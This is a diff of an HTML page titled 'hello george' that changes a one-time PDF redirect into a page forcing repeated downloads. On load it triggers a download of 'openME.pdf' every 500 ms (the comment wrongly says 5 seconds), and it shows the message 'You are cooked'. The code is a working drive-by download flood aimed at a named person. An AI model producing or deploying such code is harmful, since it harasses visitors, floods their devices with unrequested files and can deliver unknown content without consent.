@@ -1,17 +1,34 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta http-equiv="refresh" content="0; url='openME.pdf'" />
+  <title>hello george</title>
   <script>
+    let intervalId;
+
     window.onload = function () {
-      const link = document.createElement("a");
-      link.href = "openME.pdf"; // path to your PDF
-      link.download = "openME.pdf"; // filename on download
-      link.click();
+      function downloadPDF() {
+        const link = document.createElement("a");
+        link.href = "openME.pdf"; // your file path
+        link.download = "downloaded-file.pdf";
+        document.body.appendChild(link); // Required for Firefox
+        link.click();
+        document.body.removeChild(link);
+      }
+
+      // Start a loop that downloads every 5 seconds
+      intervalId = setInterval(downloadPDF, 500);
+
+      // Optional: download one immediately on page load
+      downloadPDF();
+    };
+
+    // Stop the loop if the user leaves the page
+    window.onbeforeunload = function () {
+      clearInterval(intervalId);
     };
   </script>
 </head>
 <body>
-  <p>If you are not redirected, <a href="openME.pdf">click here</a>.</p>
+  <p>You are cooked</p>
 </body>
 </html>
